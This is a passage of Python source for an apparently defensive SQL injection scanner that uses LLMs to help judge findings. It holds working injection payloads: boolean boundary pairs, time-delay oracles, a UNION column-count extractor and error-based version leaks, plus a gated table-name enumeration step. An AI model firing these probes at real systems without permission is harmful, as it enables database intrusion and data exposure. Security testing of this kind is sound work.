"""
agent/sqli_agent.py — SQLSlayer SQL Injection Detection Agent

Architecture:
  SQLSlayer.scan_endpoint()
    → fires payloads
    → static_detection() — fast heuristic pass
    → llm_analysis()     — semantic LLM pass (Claude or Groq)
    → score_finding()    — CVSS risk assignment
    → returns List[Finding]

LLM Integration:
  - Primary:  Anthropic Claude  (claude-sonnet-4-20250514)
  - Fallback: Groq             (llama-3.3-70b-versatile)
  - Offline:  Static heuristics only
"""
import re
import os
import json
import time
import urllib.request
import urllib.error
import urllib.parse
import socket
from typing import List, Optional, Dict, Any, Tuple

from config import CONFIG
from agent.payload_engine import (
    Payload, PAYLOADS, PayloadCategory, get_payloads_by_category, filter_safe
)
from agent.vulnerability_model import (
    Finding, DetectionMethod, RiskLevel, score_finding, derive_reported_category
)
from agent import response_compare as rc
from agent.dbms_fingerprint import (
    fingerprint as dbms_fingerprint, time_oracle_payloads,
)
from utils.http_client import http_request, HTTPResponse
from utils.logger import logger


# ─────────────────────────────────────────────────────────────────────────────
# STATIC DETECTION PATTERNS
# ─────────────────────────────────────────────────────────────────────────────
DB_ERROR_PATTERNS = [
    r"syntax error",
    r"sqlite_",
    r"sqlite3\.OperationalError",
    r"unclosed quotation",
    r"mysql_fetch",
    r"ORA-\d{5}",
    r"Microsoft.*SQL.*Server",
    r"ODBC.*Driver",
    r"pg_query",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"PSQLException",
    r"org\.postgresql",
    r"SQLiteException",
    r"near \".+\": syntax error",
    r"unrecognized token",
    r"no such column",
    r"no such table",
    r"ambiguous column",
]

SQLI_INDICATORS = [
    r"union\s+select",
    r"information_schema",
    r"sqlite_master",
    r"sys\.tables",
    r"sysobjects",
    r"\bpassword\b",
    r"admin.*token",
    r"jwt_mock",          # our vulnerable API leaks this on bypass
]

COMPILED_ERROR_PATTERNS   = [re.compile(p, re.IGNORECASE) for p in DB_ERROR_PATTERNS]
COMPILED_INDICATOR_PATTERNS = [re.compile(p, re.IGNORECASE) for p in SQLI_INDICATORS]


def _split_url(url: str) -> Tuple[str, Dict[str, str]]:
    """Split a URL into (url_without_query, {param: value}).

    Keeps only the first value when a parameter repeats. Returns the URL with
    its query string stripped so callers can re-attach parameters cleanly.
    """
    parsed = urllib.parse.urlsplit(url)
    query = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    clean = urllib.parse.urlunsplit(
        (parsed.scheme, parsed.netloc, parsed.path, "", "")
    )
    return clean, query


# ─────────────────────────────────────────────────────────────────────────────
# LLM CLIENT — multi-provider via raw HTTP (no SDK). Cloud + local models.
# Providers/models are defined in agent/llm_providers.py (the hook).
# ─────────────────────────────────────────────────────────────────────────────
SYSTEM_PROMPT = "You are an expert in web application security and SQL injection analysis."


class LLMClient:
    """Provider-agnostic chat client. Dispatches by wire format:
       'anthropic' (Messages API) or 'openai' (Chat Completions — Groq, OpenAI,
       Ollama, LM Studio, llama.cpp, OpenRouter, …). Local providers need no key."""

    def __init__(self):
        self.cfg     = CONFIG.llm
        self.spec    = CONFIG.llm.spec()
        self.api_key = CONFIG.llm.resolve_key()

    def available(self) -> bool:
        # Local providers (requires_key=False) are always usable; cloud needs a key.
        return (not self.spec.requires_key) or bool(self.api_key)

    def describe(self) -> str:
        return f"{self.cfg.provider}:{self.cfg.active_model}"

    def preflight(self) -> Tuple[bool, str]:
        """One-time reachability check run at startup.

        Cloud: confirm a key is present (we don't burn a paid call to probe).
        Local: open a short TCP connection to the endpoint host so an offline
        server is detected ONCE instead of failing on every probe.
        Returns (ok, reason).
        """
        if self.spec.requires_key and not self.api_key:
            return False, f"no API key for provider '{self.cfg.provider}'"
        if not self.spec.requires_key:
            parsed = urllib.parse.urlsplit(self.cfg.endpoint)
            host = parsed.hostname or "localhost"
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            try:
                with socket.create_connection((host, port), timeout=2):
                    pass
            except Exception:
                return False, (f"local model endpoint {host}:{port} is unreachable "
                               f"(is '{self.cfg.provider}' running?)")
        return True, "ok"

    def analyse(self, prompt: str) -> str:
        if not self.available():
            return ""
        try:
            if self.cfg.api_style == "anthropic":
                return self._call_anthropic(prompt)
            return self._call_openai(prompt)        # openai-compatible (cloud + local)
        except Exception as e:
            logger.warning(f"LLM call failed ({self.describe()}): {e}")
            return ""

    def _post(self, headers: dict, payload: dict) -> dict:
        headers.setdefault("Content-Type", "application/json")
        headers.setdefault("User-Agent", "SQLSlayer/1.0")
        req = urllib.request.Request(
            self.cfg.endpoint, data=json.dumps(payload).encode(),
            headers=headers, method="POST",
        )
        with urllib.request.urlopen(req, timeout=60) as resp:
            return json.loads(resp.read())

    def _call_anthropic(self, prompt: str) -> str:
        data = self._post(
            {"x-api-key": self.api_key or "", "anthropic-version": "2023-06-01"},
            {"model": self.cfg.active_model, "max_tokens": self.cfg.max_tokens,
             "temperature": self.cfg.temperature, "system": SYSTEM_PROMPT,
             "messages": [{"role": "user", "content": prompt}]},
        )
        return data["content"][0]["text"].strip()

    def _call_openai(self, prompt: str) -> str:
        headers = {}
        if self.api_key:                              # omitted for local servers
            headers["Authorization"] = f"Bearer {self.api_key}"
        data = self._post(headers, {
            "model": self.cfg.active_model, "max_tokens": self.cfg.max_tokens,
            "temperature": self.cfg.temperature,
            "messages": [{"role": "system", "content": SYSTEM_PROMPT},
                         {"role": "user", "content": prompt}],
        })
        return data["choices"][0]["message"]["content"].strip()


# ─────────────────────────────────────────────────────────────────────────────
# CORE AGENT
# ─────────────────────────────────────────────────────────────────────────────
class SQLSlayer:
    """
    SQLSlayer.

    Usage:
        agent = SQLSlayer()
        findings = agent.scan_endpoint(
            endpoint   = "/api/users",
            method     = "GET",
            param_name = "id",
            param_type = "query",   # query | body | header | json
        )
    """

    def __init__(self):
        self.base_url = CONFIG.target.base_url
        self.llm      = LLMClient()
        self._baseline_cache: Dict[str, HTTPResponse] = {}
        logger.info(f"SQLSlayer initialised | LLM: {self.llm.describe()} "
                    f"({'✓ ready' if self.llm.available() else '✗ unavailable – static mode'})")

    # ──────────────────────────────────────────────────────────────────────────
    # PUBLIC: SCAN ONE ENDPOINT (relative to CONFIG.target.base_url)
    # ──────────────────────────────────────────────────────────────────────────
    def scan_endpoint(
        self,
        endpoint:   str,
        method:     str,
        param_name: str,
        param_type: str,           # query | body | header | json
        baseline_value: str = "1",
        extra_body: Optional[dict] = None,
        payloads:   Optional[List[Payload]] = None,
    ) -> List[Finding]:
        """Scan a single parameter on an endpoint relative to the configured
        target base_url. Used by the bundled vulnerable-API demo / scenarios."""
        return self._probe(
            url            = self.base_url + endpoint,
            endpoint_label = endpoint,
            method         = method,
            param_name     = param_name,
            param_type     = param_type,
            baseline_value = baseline_value,
            extra_body     = extra_body,
            payloads       = payloads,
        )

    # ──────────────────────────────────────────────────────────────────────────
    # PUBLIC: SCAN AN ABSOLUTE URL (url / file / domain modes)
    # ──────────────────────────────────────────────────────────────────────────
    def scan_url(
        self,
        url:        str,
        param_name: str,
        method:     str = "GET",
        param_type: str = "query",
        base_query: Optional[Dict[str, str]] = None,
        baseline_value: Optional[str] = None,
        extra_body: Optional[dict] = None,
        payloads:   Optional[List[Payload]] = None,
    ) -> List[Finding]:
        """Scan one parameter on a fully-qualified URL.

        ``url`` may contain a query string; it is split off so that all existing
        parameters are preserved (via ``base_query``) and only ``param_name`` is
        injected. ``base_query`` overrides parameters parsed from the URL.
        """
        clean_url, parsed_query = _split_url(url)
        merged_query = {**parsed_query, **(base_query or {})}
        if baseline_value is None:
            baseline_value = merged_query.get(param_name, "1")

        return self._probe(
            url            = clean_url,
            endpoint_label = url,
            method         = method,
            param_name     = param_name,
            param_type     = param_type,
            baseline_value = baseline_value,
            extra_body     = extra_body,
            base_query     = merged_query,
            payloads       = payloads,
        )

    def scan_url_all_params(
        self,
        url:      str,
        method:   str = "GET",
        payloads: Optional[List[Payload]] = None,
    ) -> List[Finding]:
        """Discover every query parameter in ``url`` and scan each one."""
        _, parsed_query = _split_url(url)
        if not parsed_query:
            logger.warning(f"No parameters found in URL — skipping: {url}")
            return []
        findings: List[Finding] = []
        for param_name in parsed_query:
            findings.extend(self.scan_url(
                url        = url,
                param_name = param_name,
                method     = method,
                base_query = parsed_query,
                payloads   = payloads,
            ))
        return findings

    # ──────────────────────────────────────────────────────────────────────────
    # SHARED PROBE LOOP
    # ──────────────────────────────────────────────────────────────────────────
    def _probe(
        self,
        url:            str,
        endpoint_label: str,
        method:         str,
        param_name:     str,
        param_type:     str,
        baseline_value: str = "1",
        extra_body:     Optional[dict] = None,
        base_query:     Optional[Dict[str, str]] = None,
        payloads:       Optional[List[Payload]] = None,
    ) -> List[Finding]:
        payloads = payloads or PAYLOADS
        # Safe mode (default): never fire destructive/heavy payloads against a
        # live target. Detection still covers every SQLi class via read-only probes.
        payloads = filter_safe(payloads, allow_destructive=CONFIG.agent.allow_destructive)
        findings: List[Finding] = []

        baseline = self._get_baseline(url, method, param_name, param_type,
                                      baseline_value, extra_body, base_query)

        logger.scan(f"{method} {endpoint_label} [{param_type}:{param_name}] — {len(payloads)} payloads")

        param_dbms: Optional[str] = None     # fingerprinted backend for this param

        for payload in payloads:
            resp = self._fire_payload(url, method, param_name, param_type,
                                      payload.value, extra_body, base_query)

            # 1. Evaluate EVERY detection vector for this probe.
            signals = self._collect_signals(payload, resp, baseline)
            if signals["dbms"] and not param_dbms:
                param_dbms = signals["dbms"]
            is_vuln, confidence, evidence, det_method = self._verdict_from_signals(
                payload, signals, resp, baseline
            )

            # 2. Give the AI full visibility and let it confirm / catch misses.
            #    Runs on every probe that produced any signal (or every probe when
            #    llm_verify_all is set).
            llm_text = None
            run_llm = (CONFIG.agent.enable_llm_analysis and self.llm.available()
                       and (CONFIG.agent.llm_verify_all or signals["any_signal"]))
            if run_llm:
                ai = self._llm_analyse(endpoint_label, method, param_name,
                                       payload, resp, baseline, evidence, signals)
                if ai:
                    llm_text = ai["display"]
                    if ai["confirmed"] is True:
                        if not is_vuln:
                            # AI may promote a missed probe, but only when clearly
                            # confident — keeps weak signals out of the report.
                            if ai["confidence"] >= CONFIG.agent.llm_promote_threshold:
                                is_vuln = True
                                det_method = DetectionMethod.LLM_ANALYSIS
                                confidence = max(confidence, ai["confidence"])
                                evidence = ((evidence + " ; ") if evidence else "") + \
                                    "AI confirmed injection missed by static heuristics"
                        else:                                 # AI affirms a hit
                            confidence = max(confidence, ai["confidence"])
                    elif ai["confirmed"] is False and is_vuln \
                            and CONFIG.agent.llm_authoritative:
                        is_vuln = False                        # AI overrules FP
                        evidence += " ; AI assessed as a false positive"

            # Confidence floor — drop anything we are not sufficiently sure of.
            if is_vuln and confidence < CONFIG.agent.min_confidence:
                is_vuln = False

            # Report the class actually demonstrated (e.g. a time-based payload
            # that only leaked a DB error is reported as error-based) and score it
            # against that class so severity/remediation stay consistent.
            reported_cat = derive_reported_category(payload.category.value, det_method)
            if reported_cat != payload.category.value:
                rep_sev = {"ERROR_BASED": "HIGH", "TIME_BASED": "CRITICAL"}.get(
                    reported_cat, payload.severity)
                risk, cvss, remediation = score_finding(reported_cat, rep_sev, is_vuln, confidence)
            else:
                risk, cvss, remediation = score_finding(
                    payload.category.value, payload.severity, is_vuln, confidence
                )

            finding = Finding(
                endpoint         = endpoint_label,
                method           = method.upper(),
                parameter        = param_name,
                payload          = payload.value,
                payload_category = payload.category.value,
                detection_method = det_method,
                is_vulnerable    = is_vuln,
                risk_level       = risk,
                cvss_score       = cvss,
                confidence       = confidence,
                evidence         = evidence,
                llm_analysis     = llm_text or None,
                response_code    = resp.status_code,
                response_time_ms = resp.response_time_ms,
                remediation      = remediation,
                dbms             = signals["dbms"],
                reported_category = reported_cat,
            )
            findings.append(finding)

            if is_vuln:
                logger.finding(
                    f"VULNERABLE  {endpoint_label} | {param_name}={payload.value[:40]}…"
                    f"  [{risk.value} CVSS:{cvss}]"
                )

        # ── Confirmation oracles (run once per parameter; high precision) ─────
        cats = {p.category for p in payloads}

        if PayloadCategory.BOOLEAN_BLIND in cats:
            ora = self._boolean_oracle(url, method, param_name, param_type,
                                       baseline_value, extra_body, base_query, baseline)
            if ora:
                tv, ev, tr = ora
                risk, cvss, rem = score_finding("BOOLEAN_BLIND", "HIGH", True, 0.9)
                findings.append(Finding(
                    endpoint=endpoint_label, method=method.upper(), parameter=param_name,
                    payload=f"{tv}  ⟷  (FALSE variant)", payload_category="BOOLEAN_BLIND",
                    detection_method=DetectionMethod.DIFFERENTIAL, is_vulnerable=True,
                    risk_level=risk, cvss_score=cvss, confidence=0.9, evidence=ev,
                    llm_analysis=None, response_code=tr.status_code,
                    response_time_ms=tr.response_time_ms, remediation=rem, dbms=param_dbms,
                ))
                logger.finding(f"VULNERABLE  {endpoint_label} | boolean true/false oracle "
                               f"confirmed [{risk.value} CVSS:{cvss}]")

        if PayloadCategory.TIME_BASED in cats:
            ora = self._time_oracle(url, method, param_name, param_type,
                                    baseline_value, extra_body, base_query, param_dbms)
            if ora:
                pv, ev, tr = ora
                risk, cvss, rem = score_finding("TIME_BASED", "CRITICAL", True, 0.9)
                findings.append(Finding(
                    endpoint=endpoint_label, method=method.upper(), parameter=param_name,
                    payload=pv, payload_category="TIME_BASED",
                    detection_method=DetectionMethod.TIME_DELTA, is_vulnerable=True,
                    risk_level=risk, cvss_score=cvss, confidence=0.9, evidence=ev,
                    llm_analysis=None, response_code=tr.status_code,
                    response_time_ms=tr.response_time_ms, remediation=rem, dbms=param_dbms,
                ))
                logger.finding(f"VULNERABLE  {endpoint_label} | time-based oracle "
                               f"confirmed [{risk.value} CVSS:{cvss}]")

        vuln_count = sum(1 for f in findings if f.is_vulnerable)

        # Harmless exploitability proof — run once if the parameter is vulnerable.
        if CONFIG.agent.enable_confirmation and vuln_count:
            proof = self._confirm_poc(url, method, param_name, param_type,
                                      baseline_value, extra_body, base_query, param_dbms)
            if proof:
                for f in findings:
                    if f.is_vulnerable:
                        f.confirmation = proof
                logger.success(f"  └─ {proof[:96]}…")

            # Gated deeper step: enumerate TABLE NAMES only (no row data).
            if CONFIG.agent.enable_exploit:
                tables = self._enumerate_tables(url, method, param_name, param_type,
                                                baseline_value, extra_body, base_query, param_dbms)
                if tables:
                    for f in findings:
                        if f.is_vulnerable:
                            f.exploitation = tables
                    logger.critical(f"  └─ [EXPLOIT] {tables[:96]}…")

        if param_dbms:
            logger.info(f"  └─ backend fingerprint: {param_dbms}")
        logger.info(f"  └─ {vuln_count}/{len(findings)} probes confirmed vulnerable")
        return findings

    # ──────────────────────────────────────────────────────────────────────────
    # FIRE ONE PAYLOAD
    # ──────────────────────────────────────────────────────────────────────────
    def _fire_payload(
        self,
        url: str,
        method: str,
        param_name: str,
        param_type: str,
        payload_value: str,
        extra_body: Optional[dict],
        base_query: Optional[Dict[str, str]] = None,
    ) -> HTTPResponse:
        params = body = headers = None

        if param_type == "query":
            # Preserve sibling params; inject only the target one.
            params = dict(base_query or {})
            params[param_name] = payload_value
        elif param_type in ("body", "json"):
            body = dict(extra_body or {})
            body[param_name] = payload_value
            if base_query:
                params = dict(base_query)
        elif param_type == "header":
            headers = {"User-Agent": "SQLSlayer/1.0", param_name: payload_value}
            if base_query:
                params = dict(base_query)

        return http_request(
            url, method=method,
            params=params, json_body=body,
            headers=headers,
            timeout=CONFIG.target.request_timeout,
        )

    def _get_baseline(self, url, method, param_name, param_type,
                      baseline_value, extra_body, base_query=None) -> HTTPResponse:
        cache_key = f"{method}:{url}:{param_name}:{param_type}"
        if cache_key in self._baseline_cache:
            return self._baseline_cache[cache_key]
        resp = self._fire_payload(url, method, param_name, param_type,
                                  baseline_value, extra_body, base_query)
        self._baseline_cache[cache_key] = resp
        return resp

    # ──────────────────────────────────────────────────────────────────────────
    # SIGNAL COLLECTION — evaluate EVERY detection vector (no short-circuit)
    # ──────────────────────────────────────────────────────────────────────────
    def _collect_signals(
        self,
        payload: Payload,
        resp:     HTTPResponse,
        baseline: HTTPResponse,
    ) -> Dict[str, Any]:
        """Compute every detection signal so nothing is missed and the AI gets
        full visibility. Returns a dict of raw values + triggered flags."""
        body  = resp.body or ""
        bbody = baseline.body or ""

        db_errors  = [p.pattern for p in COMPILED_ERROR_PATTERNS if p.search(body)]
        indicators = [p.pattern for p in COMPILED_INDICATOR_PATTERNS
                      if p.search(body) and not p.search(bbody)]

        time_delta = resp.response_time_ms - baseline.response_time_ms
        time_triggered = time_delta > (CONFIG.target.time_based_threshold * 1000)

        status_changed = resp.status_code != baseline.status_code
        blen, plen = len(bbody), len(body)
        len_ratio = (abs(plen - blen) / blen) if blen > 0 else 0.0

        rows_b = rows_p = None
        try:
            bd, rd = baseline.json(), resp.json()
            if isinstance(bd, dict) and isinstance(rd, dict):
                b_data, r_data = bd.get("data"), rd.get("data")
                if isinstance(b_data, list) and isinstance(r_data, list):
                    rows_b, rows_p = len(b_data), len(r_data)
        except Exception:
            pass
        rows_increased = rows_b is not None and rows_p is not None and rows_p > rows_b

        expected_hit = bool(
            payload.expected_indicator
            and payload.expected_indicator in body.lower()
            and payload.expected_indicator not in bbody.lower()
        )
        http_500 = resp.status_code == 500 and baseline.status_code == 200

        any_signal = bool(
            db_errors or indicators or expected_hit or http_500 or rows_increased
            or status_changed or len_ratio > 0.4 or time_triggered
        )

        return {
            "db_errors": db_errors, "indicators": indicators,
            "expected_hit": expected_hit, "http_500": http_500,
            "time_delta": time_delta, "time_triggered": time_triggered,
            "status_changed": status_changed, "len_ratio": len_ratio,
            "blen": blen, "plen": plen, "rows_b": rows_b, "rows_p": rows_p,
            "rows_increased": rows_increased, "any_signal": any_signal,
            "dbms": dbms_fingerprint(body),     # backend fingerprint, if leaked
        }

    def _verdict_from_signals(
        self, payload: Payload, s: Dict[str, Any], resp: HTTPResponse, baseline: HTTPResponse,
    ) -> Tuple[bool, float, str, DetectionMethod]:
        """Heuristic verdict over the FULL signal set, tiered for precision.

        STRONG signals (a leaked SQL error, reflected SQL/UNION metadata, a
        reliable time delay, or a tautology returning extra rows) are high-
        confidence true positives and flag on their own.

        WEAK signals alone (a status change, a length difference, or a bare HTTP
        500 — all of which an empty result set or a benign error can produce) do
        NOT flag by themselves: they are recorded for the AI to corroborate, which
        keeps false positives out of the report.
        """
        EL, SP, TD, DF = (DetectionMethod.ERROR_LEAK, DetectionMethod.STATIC_PATTERN,
                          DetectionMethod.TIME_DELTA, DetectionMethod.DIFFERENTIAL)
        # (triggered, strong?, confidence, method, evidence) — priority order.
        checks = [
            (bool(s["db_errors"]), True, 0.95, EL,
             f"DB error pattern(s): {', '.join(s['db_errors'][:3])}"),
            (bool(s["indicators"]), True, 0.90, SP,
             f"SQLi indicator(s) appeared: {', '.join(s['indicators'][:3])}"),
            (s["rows_increased"], True, 0.85, DF,
             f"Row count increased {s['rows_b']} → {s['rows_p']} (tautology successful)"),
            (s["expected_hit"], True, 0.70, SP,
             f"Expected indicator '{payload.expected_indicator}' appeared post-injection"),
            # ── weak / corroborating only ──
            # A single-request time delta is jitter-prone — the time ORACLE
            # (calibrated + confirmed) is the authoritative time-based path.
            (payload.category == PayloadCategory.TIME_BASED and s["time_triggered"], False, 0.55, TD,
             f"(weak) single-shot response delay Δ{s['time_delta']:.0f}ms"),
            (payload.category == PayloadCategory.BOOLEAN_BLIND and s["status_changed"], False, 0.55, DF,
             f"(weak) status changed {baseline.status_code} → {resp.status_code}"),
            (payload.category == PayloadCategory.BOOLEAN_BLIND and s["len_ratio"] > 0.4, False, 0.50, DF,
             f"(weak) body-length differential {s['len_ratio']:.0%} ({s['blen']} → {s['plen']})"),
            (s["http_500"], False, 0.55, EL, "(weak) HTTP 500 triggered (baseline was 200)"),
        ]
        triggered = [c for c in checks if c[0]]
        if not triggered:
            return False, 0.0, "", DetectionMethod.STATIC_PATTERN

        strong = [c for c in triggered if c[1]]
        evidence = " ; ".join(c[4] for c in triggered)   # ALL hits — full visibility
        if strong:
            confidence = max(c[2] for c in strong)
            method = strong[0][3]                         # highest-priority strong hit
            return True, confidence, evidence, method
        # weak-only → not flagged by heuristics; left for the AI to judge
        weak_conf = max(c[2] for c in triggered)
        return False, weak_conf, evidence, triggered[0][3]

    # ──────────────────────────────────────────────────────────────────────────
    # BOOLEAN-BLIND ORACLE — boundary probing + similarity ratio + confirmation
    # (ghauri/sqlmap-style; low false-positive)
    # ──────────────────────────────────────────────────────────────────────────
    # Injection boundaries: (label, TRUE-cond template, FALSE-cond template).
    BOOLEAN_BOUNDARIES = [
        ("numeric",        "{bv} AND 1=1",          "{bv} AND 1=2"),
        ("single-quote",   "{bv}' AND '1'='1",      "{bv}' AND '1'='2"),
        ("single-comment", "{bv}' AND 1=1-- -",     "{bv}' AND 1=2-- -"),
        ("double-quote",   '{bv}" AND "1"="1',      '{bv}" AND "1"="2'),
        ("paren-single",   "{bv}') AND ('1'='1",    "{bv}') AND ('1'='2"),
        ("paren-numeric",  "{bv}) AND (1=1",        "{bv}) AND (1=2"),
    ]

    def _boolean_oracle(
        self, url, method, param_name, param_type,
        baseline_value, extra_body, base_query, baseline: HTTPResponse,
    ) -> Optional[Tuple[str, str, HTTPResponse]]:
        """Confirm boolean-blind SQLi rigorously across several injection
        boundaries. For each boundary we send a TRUE and a FALSE condition:

          • If the page is stable, compare with a normalised similarity RATIO —
            TRUE must track the baseline (ratio ≥ threshold) and FALSE must
            diverge from TRUE (ratio < threshold).
          • Otherwise fall back to a structural signal (status + row count).

        A match is then CONFIRMED with a second TRUE/FALSE pair to defeat noise.
        Non-injectable parameters treat the payloads as literals, so the oracle
        stays silent — no false positive.
        """
        bv = baseline_value
        fire = lambda v: self._fire_payload(url, method, param_name, param_type,
                                            v, extra_body, base_query)
        sim_th    = CONFIG.target.boolean_similarity_threshold
        stable_th = CONFIG.target.page_stability_threshold

        # Second baseline to gauge page stability (dynamic content detection).
        baseline2 = fire(bv)
        stable = rc.page_is_stable(baseline.body, baseline2.body, [bv], stable_th)
        n_base = rc.normalize(baseline.body, [bv])

        def rows(r: HTTPResponse):
            try:
                d = r.json()
                if isinstance(d, dict) and isinstance(d.get("data"), list):
                    return len(d["data"])
            except Exception:
                pass
            return None

        def tracks_baseline(r: HTTPResponse, true_payload: str) -> bool:
            if r.status_code != baseline.status_code:
                return False
            if stable:
                return rc.ratio(rc.normalize(r.body, [true_payload, bv]), n_base) >= sim_th
            rr, rb = rows(r), rows(baseline)
            return rr == rb if (rr is not None and rb is not None) else True

        def diverges(false_r: HTTPResponse, true_r: HTTPResponse,
                     false_payload: str, true_payload: str) -> bool:
            if false_r.status_code != true_r.status_code:
                return True
            if stable:
                a = rc.normalize(false_r.body, [false_payload, bv])
                b = rc.normalize(true_r.body, [true_payload, bv])
                return rc.ratio(a, b) < sim_th
            rf, rt = rows(false_r), rows(true_r)
            return rf != rt if (rf is not None and rt is not None) else False

        def holds(tv, fv) -> bool:
            tr, fr = fire(tv), fire(fv)
            return tracks_baseline(tr, tv) and diverges(fr, tr, fv, tv)

        for label, tfmt, ffmt in self.BOOLEAN_BOUNDARIES:
            tv, fv = tfmt.format(bv=bv), ffmt.format(bv=bv)
            tr = fire(tv)
            fr = fire(fv)
            if tracks_baseline(tr, tv) and diverges(fr, tr, fv, tv):
                if not holds(tv, fv):          # confirmation pass — defeat noise
                    continue
                mode = f"ratio≥{sim_th}" if stable else "row/status differential"
                ev = (f"Boolean oracle [{label}] confirmed ({mode}): TRUE [{tv}] tracks "
                      f"baseline while FALSE [{fv}] diverges — response follows the "
                      f"injected condition (re-tested).")
                return tv, ev, tr
        return None

    # ──────────────────────────────────────────────────────────────────────────
    # TIME-BASED ORACLE — calibrated baseline + control + confirmation (jitter-safe)
    # ──────────────────────────────────────────────────────────────────────────
    def _time_oracle(
        self, url, method, param_name, param_type,
        baseline_value, extra_body, base_query, dbms: Optional[str] = None,
    ) -> Optional[Tuple[str, str, HTTPResponse]]:
        """Confirm time-based blind SQLi without false positives from jitter:

          1. Calibrate normal latency over several baseline requests.
          2. Fire a delay payload; require elapsed ≥ baseline + threshold.
          3. Confirm with a second delayed request AND verify a non-delay control
             stays fast — so a generally-slow endpoint can't trigger a finding.
        """
        bv = baseline_value
        fire = lambda v: self._fire_payload(url, method, param_name, param_type,
                                            v, extra_body, base_query)
        delay = int(CONFIG.target.time_based_threshold) + 2
        threshold_ms = CONFIG.target.time_based_threshold * 1000

        cal = [fire(bv).response_time_ms for _ in range(3)]
        base = max(cal)                                  # worst-case normal latency

        # Candidates span every DBMS delay form across every injection boundary
        # (numeric, single/double-quote, paren, stacked) so a delay is detected in
        # quoted-string contexts too — prefer the fingerprinted DBMS first.
        candidates = time_oracle_payloads(bv, delay, dbms)

        for name, pv in candidates:
            r1 = fire(pv)
            if r1.response_time_ms - base < threshold_ms:
                continue
            r2 = fire(pv)                                # confirm the delay repeats
            ctrl = fire(f"{bv} AND 1=1")                 # control must stay fast
            if (r2.response_time_ms - base >= threshold_ms
                    and ctrl.response_time_ms - base < threshold_ms):
                ev = (f"Time oracle [{name}] confirmed: payload delayed "
                      f"{r1.response_time_ms:.0f}ms & {r2.response_time_ms:.0f}ms vs "
                      f"baseline ~{base:.0f}ms (control {ctrl.response_time_ms:.0f}ms) — "
                      f"two confirmed delays, fast control.")
                return pv, ev, r1
        return None

    # ──────────────────────────────────────────────────────────────────────────
    # HARMLESS CONFIRMATION — prove exploitability without touching app data
    # ──────────────────────────────────────────────────────────────────────────
    # Unique, benign marker we inject and look for in the response.
    POC_MARKER = "SQLSLAYERxPoC"

    def _union_extract(
        self, url, method, param_name, param_type,
        baseline_value, extra_body, base_query, inner_exprs, dbms: Optional[str],
    ) -> Optional[Tuple[str, int, str, Optional[str]]]:
        """Generic, read-only UNION extractor.

        Auto-detects the injection boundary and column count, then injects
        `<MARKER>:<inner>:<MARKER>` into the first column. For the first inner
        expression that reflects, returns (payload, ncols, prefix, value).

        ``inner_exprs`` are SQL scalar expressions to try (a version function, a
        table-name aggregate, …). Strictly read-only.
        """
        bv = baseline_value
        marker = self.POC_MARKER
        fire = lambda v: self._fire_payload(url, method, param_name, param_type,
                                            v, extra_body, base_query)

        def has_error(r: HTTPResponse) -> bool:
            return any(p.search(r.body) for p in COMPILED_ERROR_PATTERNS)

        def wrapped(expr: str) -> str:                 # DBMS-specific string concat
            if dbms in ("MySQL", "Microsoft SQL Server"):
                return f"CONCAT('{marker}:',{expr},':{marker}')"
            return f"'{marker}:'||{expr}||':{marker}'"  # SQLite / PostgreSQL / Oracle

        marker_re = re.compile(re.escape(marker) + r":(.*?):" + re.escape(marker), re.DOTALL)
        closers = [("", ""), ("'", ""), ('"', ""), ("')", ""), (")", "")]

        for pre, _ in closers:
            ncols = None
            for n in range(1, 9):
                nulls = ",".join(["NULL"] * n)
                r = fire(f"{bv}{pre} UNION SELECT {nulls}-- -")
                if r.status_code == 200 and not has_error(r):
                    ncols = n
                    break
            if not ncols:
                continue
            for expr in inner_exprs:
                cols = [wrapped(expr)] + ["NULL"] * (ncols - 1)
                payload = f"{bv}{pre} UNION SELECT {','.join(cols)}-- -"
                r = fire(payload)
                if marker in r.body:
                    m = marker_re.search(r.body)
                    return payload, ncols, (pre or ""), (m.group(1).strip() if m else None)
        return None

    def _confirm_poc(
        self, url, method, param_name, param_type,
        baseline_value, extra_body, base_query, dbms: Optional[str],
    ) -> Optional[str]:
        """Attempt a HARMLESS proof of exploitability on a confirmed-vulnerable
        parameter. Strategy (read-only, no application/user data):

          1. UNION-based: auto-detect the column count, then inject a row whose
             first column is `<MARKER>:<dbms-version>:<MARKER>`. If the marker is
             reflected, the attacker fully controls the query and we extract a
             benign system value (the database version).
          2. Error-based fallback (MySQL/MSSQL): leak the version via a forced
             error (EXTRACTVALUE / CONVERT) — still only the version banner.

        Returns a human-readable proof string, or None if it can't confirm.
        """
        bv = baseline_value
        marker = self.POC_MARKER
        fire = lambda v: self._fire_payload(url, method, param_name, param_type,
                                            v, extra_body, base_query)

        def has_error(r: HTTPResponse) -> bool:
            return any(p.search(r.body) for p in COMPILED_ERROR_PATTERNS)

        # version functions to try (prefer the fingerprinted DBMS form)
        ver_by_dbms = {
            "SQLite": "sqlite_version()", "MySQL": "version()",
            "PostgreSQL": "version()", "Microsoft SQL Server": "@@version",
            "Oracle": "(SELECT banner FROM v$version WHERE rownum=1)",
        }
        version_funcs = []
        if dbms in ver_by_dbms:
            version_funcs.append(ver_by_dbms[dbms])
        for vf in ("sqlite_version()", "version()", "@@version"):
            if vf not in version_funcs:
                version_funcs.append(vf)

        # ── 1. UNION marker + version ─────────────────────────────────────────
        res = self._union_extract(url, method, param_name, param_type,
                                  bv, extra_body, base_query, version_funcs, dbms)
        if res:
            payload, ncols, pre, val = res
            version = val or "(reflected; version unreadable)"
            boundary = (pre + "…UNION") if pre else "UNION"
            return (f"Exploitability CONFIRMED (harmless): UNION injection "
                    f"[{boundary}, {ncols} cols] reflected our unique marker "
                    f"'{marker}' and read the DBMS version → {version}. "
                    f"No application/user data was accessed. PoC payload: {payload}")

        # ── 2. Error-based version (MySQL / MSSQL) ────────────────────────────
        err_payloads = []
        if dbms == "MySQL":
            err_payloads = [f"{bv}' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
                            f"{bv} AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"]
        elif dbms == "Microsoft SQL Server":
            err_payloads = [f"{bv}' AND 1=CONVERT(int,@@version)-- -",
                            f"{bv} AND 1=CONVERT(int,@@version)-- -"]
        for payload in err_payloads:
            r = fire(payload)
            mv = re.search(r"\d+\.\d+\.\d+[\w.\-]*", r.body)
            if has_error(r) and mv:
                return (f"Exploitability CONFIRMED (harmless): error-based injection "
                        f"leaked the DBMS version → {mv.group(0)} via a forced error. "
